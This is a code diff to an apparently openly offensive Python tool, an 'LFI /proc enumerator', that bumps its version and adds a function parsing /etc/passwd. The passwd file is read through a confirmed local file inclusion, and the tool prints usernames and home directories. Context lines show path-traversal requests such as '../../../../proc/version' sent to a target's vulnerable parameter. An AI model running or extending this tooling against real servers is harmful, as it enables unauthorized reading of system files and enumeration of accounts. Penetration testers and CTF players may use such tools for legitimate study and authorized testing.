@@ -12,10 +12,27 @@ def print_banner():
      |  ___/ '__/ _ \ / __| |     \___ \ 
      | |   | | | (_) | (__| |____ ____) |
      |_|   |_|  \___/ \___|______|_____/"""
-    version = "1.2.0"
+    version = "1.3.0"
     credit = f"{' ' * 34}By Abgache\n{' ' * 34}Version: {version}\n"
     print(banner)
     print(credit)
+
+def passwd_ls(passwd_content: str):
+    users = []
+
+    for line in passwd_content.splitlines():
+        parts = line.strip().split(":")
+
+        if len(parts) < 7:
+            continue
+
+        username = parts[0]
+        home = parts[5]
+
+        if home.startswith("/home"):
+            users.append((username, home))
+
+    return users
 
 def main():
     parser = argparse.ArgumentParser(description="LFI /proc enumerator")
@@ -53,6 +70,10 @@ def main():
         return
     else:
         print(f"{Fore.GREEN}[+]{Style.RESET_ALL} LFI confirmed")
+        passwd=passwd_ls(test.text)
+        for usr in passwd:
+            print(f"{Fore.CYAN}[+]{Style.RESET_ALL} User found: {usr[0]}, Home: {usr[1]}")
+        
 
     ver_url = f"{base}/{args.path}?{args.param}=../../../../proc/version"
     ver = requests.get(ver_url, timeout=3)
